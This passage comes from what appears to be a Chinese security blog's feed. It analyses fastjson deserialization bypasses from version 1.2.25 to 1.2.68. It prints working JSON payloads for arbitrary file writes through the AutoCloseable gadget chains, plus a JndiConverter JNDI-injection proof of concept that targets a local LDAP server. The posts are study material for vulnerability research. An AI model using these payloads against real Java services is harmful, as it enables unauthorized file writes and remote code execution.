    <content type="html"><![CDATA[<h1 id="0x01-环境搭建以及漏洞简述："><a href="#0x01-环境搭建以及漏洞简述：" class="headerlink" title="0x01 环境搭建以及漏洞简述："></a>0x01 环境搭建以及漏洞简述：</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.68<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><p>fastjson 的这个新漏洞在 1.2.68 及之前版本的 autotype 关闭的情况下仍然可以绕过限制反序列化，相比 1.2.47 版本的漏洞来讲这个版本的漏洞还是有一些限制的（1.2.47版本主要是利用了fastjson会class进行缓存的机制，在第一次扫描中记录到类后会将该类写入mappings中，第二次扫描mappings中就有我们的恶意类，因此绕过了autotype的校验）。在1.2.47版本中可以绕过autotype的校验，但这个版本则需要该类实现<code>AutoCloseable</code>接口。</p><p>fastjson 1.2.68 在进行反序列化的时候，会进入 <code>ObjectDeserializer</code> 的 <code>deserialze</code> 方法，而 安全人员发现 当 <code>@type</code> 为 <code>java.lang.AutoCloseable</code> 的时候会找到实现类 <code>JavaBeanDeserializer</code> 调用 <code>deserialze</code>，而 <code>JavaBeanDeserializer</code> 的 <code>deserialze</code> 方法还会继续解析得到第二个 <code>@type</code> 对应的值进行反序列化，并且 <code>expectClass</code> 则不再是 <code>null</code> 值，而是 <code>java.lang.AutoCloseable</code>。</p><p>fastjson版本&lt;&#x3D;1.2.68有这几条利用链：</p><ol><li>Mysql connector RCE</li><li>Apache commons io read and write files</li><li>Jetty SSRF</li><li>Apache xbean-reflect RCE</li></ol><h1 id="0x02-漏洞原理："><a href="#0x02-漏洞原理：" class="headerlink" title="0x02 漏洞原理："></a>0x02 漏洞原理：</h1><h1 id="0x03-调用链："><a href="#0x03-调用链：" class="headerlink" title="0x03 调用链："></a>0x03 调用链：</h1><h2 id="MarshalOutputStream读文件："><a href="#MarshalOutputStream读文件：" class="headerlink" title="MarshalOutputStream读文件："></a>MarshalOutputStream读文件：</h2><p>只适用于jdk11？不依赖于第三方库。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;sun.rmi.server.MarshalOutputStream&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;out&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.util.zip.InflaterOutputStream&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;out&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>           <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.io.FileOutputStream&quot;</span><span class="hljs-punctuation">,</span><br>           <span class="hljs-attr">&quot;file&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/tmp/asdasd&quot;</span><span class="hljs-punctuation">,</span><br>           <span class="hljs-attr">&quot;append&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;infl&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>           <span class="hljs-attr">&quot;input&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>               <span class="hljs-attr">&quot;array&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;eJxLLE5JTCkGAAh5AnE=&quot;</span><span class="hljs-punctuation">,</span><br>               <span class="hljs-attr">&quot;limit&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">14</span><br>           <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;bufLen&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;100&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;protocolVersion&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;targetPath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;C:/Users/wdd/Desktop/ls/ls/1.txt&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;tempPath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;C:/Users/wdd/Desktop/ls/1.txt&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h2 id="commons-io-2-x写文件："><a href="#commons-io-2-x写文件：" class="headerlink" title="commons-io 2.x写文件："></a>commons-io 2.x写文件：</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;is&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;input&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;reader&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.io.input.CharSequenceReader&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;charSequence&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.String&quot;</span><span class="hljs-string">&quot;写入文件的内容&quot;</span><br>      <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;charsetName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;bufferSize&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1024</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;branch&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.io.output.WriterOutputStream&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;writer&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;file&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/tmp/pwned&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;encoding&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;append&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>      <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;charset&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;bufferSize&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1024</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;writeImmediately&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;closeBranch&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;httpContentType&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;text/xml&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;lenient&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;defaultEncoding&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;UTF-8&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p><a href="https://b1ue.cn/archives/382.html">fastjson 1.2.68 autotype bypass 反序列化漏洞 gadget 的一种挖掘思路 - 浅蓝 ‘s blog (b1ue.cn)</a></p><p><a href="https://typesafe.cn/posts/java-serialization-vulnerability-6/">Java 反序列化漏洞原理（六）fastjson 1.2.68 绕过原理 | 没有理想的人不伤心 (typesafe.cn)</a></p><p><a href="https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg">Fastjson 1.2.68 反序列化漏洞 Commons IO 2.x 写文件利用链挖掘分析 (qq.com)</a></p><p><a href="https://www.cnblogs.com/xyylll/p/15818964.html">fastjson1.2.68分析 - xyylll - 博客园 (cnblogs.com)</a></p><p><a href="https://www.cnblogs.com/zpchcbd/p/14969606.html">Java fastjson &lt;&#x3D; 1.2.68 期望类AutoCloseable之commons-io 任意文件写入 - zpchcbd - 博客园 (cnblogs.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java安全</tag>
      
      <tag>fastjson</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fastjson 反序列化基础三(1.2.62-1.2.68)</title>
    <link href="/2024/04/29/%E6%BC%8F%E6%B4%9E%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%A4%8D%E7%8E%B0/fastjson/fastjson%201262-1268/"/>
    <url>/2024/04/29/%E6%BC%8F%E6%B4%9E%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%A4%8D%E7%8E%B0/fastjson/fastjson%201262-1268/</url>
    
    <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>主要是跟着师傅学习，看这个<code>1.2.62 - 1.2.68</code>版本是如何绕过黑名单的，以及有什么好玩的利用链。</p><h1 id="1-2-62-绕过黑名单："><a href="#1-2-62-绕过黑名单：" class="headerlink" title="1.2.62 绕过黑名单："></a>1.2.62 绕过黑名单：</h1><h2 id="Exp编写："><a href="#Exp编写：" class="headerlink" title="Exp编写："></a>Exp编写：</h2><p><strong>前提条件：</strong></p><ul><li>服务端上版本是<code>&lt;=1.2.63</code>的</li><li>低版本jdk（主要是利用了jdni注入，高版本的jndi注入会受到限制，关于这部分可以看[Fastjson系列五——高版本JDK绕过及检测与防御 <a href="https://www.mi1k7ea.com/2019/11/13/Fastjson%E7%B3%BB%E5%88%97%E4%BA%94%E2%80%94%E2%80%94%E9%AB%98%E7%89%88%E6%9C%ACJDK%E7%BB%95%E8%BF%87%E5%8F%8A%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%98%B2%E5%BE%A1/"> Mi1k7ea ]</a>）</li><li>开启了<code>AutoType</code></li><li>目标服务器上需要<code>xbean-reflect</code>依赖。</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.62<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.xbean<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>xbean-reflect<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.18<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><p>查看poc：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.xbean.propertyeditor.JndiConverter\&quot;,\&quot;AsText\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;&#125;&quot;</span>;<br>        JSON.parse(poc);<br>    &#125;<br></code></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;AsText&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ldap://localhost:8085/bIZKZrFl&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h2 id="漏洞原理以及调试："><a href="#漏洞原理以及调试：" class="headerlink" title="漏洞原理以及调试："></a>漏洞原理以及调试：</h2><p>导入了x-bean坐标后，查看<code>JndiConverter</code>的<code>toObjectImpl</code>方法：</p><p>这不妥妥的jndi注入嘛：</p><p><img src="/../../../blog_image/image-20240414145902977-1716861135950-117-1716861232873-143-1716861250347-145.png" alt="image-20240414145902977"></p><p>但是这个方法又不是<code>setter/getter</code>方法啊，又是怎么调用到这个<code>toObjectImpl</code>方法的？</p><p>调用堆栈如图所示：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs stylus">toObjectImpl:<span class="hljs-number">35</span>, JndiConverter (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xbean</span>.propertyeditor)<br>toObject:<span class="hljs-number">86</span>, AbstractConverter (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xbean</span>.propertyeditor)<br>setAsText:<span class="hljs-number">59</span>, AbstractConverter (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xbean</span>.propertyeditor)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">497</span>, Method (java<span class="hljs-selector-class">.lang</span>.reflect)<br>setValue:<span class="hljs-number">110</span>, FieldDeserializer (com<span class="hljs-selector-class">.alibaba</span><span class="hljs-selector-class">.fastjson</span><span class="hljs-selector-class">.parser</span>.deserializer)<br>parseField:<span class="hljs-number">123</span>, DefaultFieldDeserializer (com<span class="hljs-selector-class">.alibaba</span><span class="hljs-selector-class">.fastjson</span><span class="hljs-selector-class">.parser</span>.deserializer)<br>parseField:<span class="hljs-number">1241</span>, JavaBeanDeserializer (com<span class="hljs-selector-class">.alibaba</span><span class="hljs-selector-class">.fastjson</span><span class="hljs-selector-class">.parser</span>.deserializer)<br>deserialze:<span class="hljs-number">866</span>, JavaBeanDeserializer (com<span class="hljs-selector-class">.alibaba</span><span class="hljs-selector-class">.fastjson</span><span class="hljs-selector-class">.parser</span>.deserializer)<br>parseRest:<span class="hljs-number">1555</span>, JavaBeanDeserializer (com<span class="hljs-selector-class">.alibaba</span><span class="hljs-selector-class">.fastjson</span><span class="hljs-selector-class">.parser</span>.deserializer)<br>deserialze:-<span class="hljs-number">1</span>, FastjsonASMDeserializer_1_JndiConverter (com<span class="hljs-selector-class">.alibaba</span><span class="hljs-selector-class">.fastjson</span><span class="hljs-selector-class">.parser</span>.deserializer)<br>deserialze:<span class="hljs-number">284</span>, JavaBeanDeserializer (com<span class="hljs-selector-class">.alibaba</span><span class="hljs-selector-class">.fastjson</span><span class="hljs-selector-class">.parser</span>.deserializer)<br>parseObject:<span class="hljs-number">395</span>, DefaultJSONParser (com<span class="hljs-selector-class">.alibaba</span><span class="hljs-selector-class">.fastjson</span>.parser)<br>parse:<span class="hljs-number">1400</span>, DefaultJSONParser (com<span class="hljs-selector-class">.alibaba</span><span class="hljs-selector-class">.fastjson</span>.parser)<br>parse:<span class="hljs-number">1366</span>, DefaultJSONParser (com<span class="hljs-selector-class">.alibaba</span><span class="hljs-selector-class">.fastjson</span>.parser)<br>parse:<span class="hljs-number">170</span>, JSON (com<span class="hljs-selector-class">.alibaba</span>.fastjson)<br>parse:<span class="hljs-number">180</span>, JSON (com<span class="hljs-selector-class">.alibaba</span>.fastjson)<br>parse:<span class="hljs-number">149</span>, JSON (com<span class="hljs-selector-class">.alibaba</span>.fastjson)<br><span class="hljs-selector-tag">main</span>:<span class="hljs-number">12</span>, Fastjson1262Exp (com.hme)<br></code></pre></td></tr></table></figure><p>很明显，调用了<code>AbstractConverter</code>的<code>setAsText</code>方法，这个类就是<code>JndiConverter</code>的父类。</p><p>所以是父类<code>AbstractConverter#setAsText</code> &#x3D;&#x3D;&gt; <code>JndiConverter#toObjectImpl</code></p><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p><a href="https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">Java反序列化Fastjson篇04-Fastjson1.2.62-1.2.68版本反序列化漏洞 | Drunkbaby’s Blog (drun1baby.top)</a></p><p>[（安全客首发）Fastjson系列六——1.2.48-1.2.68反序列化漏洞 <a href="https://www.mi1k7ea.com/2021/02/08/Fastjson%E7%B3%BB%E5%88%97%E5%85%AD%E2%80%94%E2%80%941-2-48-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"> Mi1k7ea ]</a></p>]]></content>
    
    
    <categories>
      
      <category>java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java安全</tag>
      
      <tag>fastjson</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fastjson 反序列化基础二(1.2.25-1.2.61)</title>
    <link href="/2024/04/28/%E6%BC%8F%E6%B4%9E%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%A4%8D%E7%8E%B0/fastjson/fastjson%201225-1261/"/>
    <url>/2024/04/28/%E6%BC%8F%E6%B4%9E%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%A4%8D%E7%8E%B0/fastjson/fastjson%201225-1261/</url>
    
    <content type="html"><![CDATA[<h1 id="1-分析fastjson1-2-25的修复："><a href="#1-分析fastjson1-2-25的修复：" class="headerlink" title="1. 分析fastjson1.2.25的修复："></a>1. 分析fastjson1.2.25的修复：</h1><h2 id="checkAutoType-函数"><a href="#checkAutoType-函数" class="headerlink" title="checkAutoType()函数:"></a>checkAutoType()函数:</h2><p>首先看fastjson1.2.25如何修复1.2.24版本的漏洞的：</p><p><code>1.2.24</code>版本的<code>DefaultJSONParser#parseObject</code>：</p><p><img src="/../../../blog_image/image-20240410170431936-1716861113343-69.png" alt="image-20240410170431936"></p><p>直接调用<code>TypeUtils#loadClass</code>直接加载类。</p><p>而再看<code>1.2.25</code>版本的<code>DefaultJSONParser#parseObject</code>：</p><p><img src="/../../../blog_image/image-20240410170325416-1716861113343-70.png" alt="image-20240410170325416"></p><p>如果当前key是<code>@type</code>就会调用<code>config#checkAutoType</code>。</p><p><code>checkAutoType</code>的逻辑是判断<code>autoTypeSupport</code>是否开启并且检擦白名单：</p><p><img src="/../../../blog_image/image-20240410170805351-1716861113343-71.png" alt="image-20240410170805351"></p><p>autoTypeSupport是默认不开启的，即先进行黑名单过滤，然后遍历<code>denyList</code>，然后在进行白名单过滤，若白名单匹配上则直接加载该类，否则报错。</p><p>当autoTypeSupport开启时，先白名单过滤，匹配成功即可加载该类，否则再黑名单过滤。</p><p>看大佬的注释：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;<br>    <span class="hljs-keyword">if</span> (typeName == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br> <br>    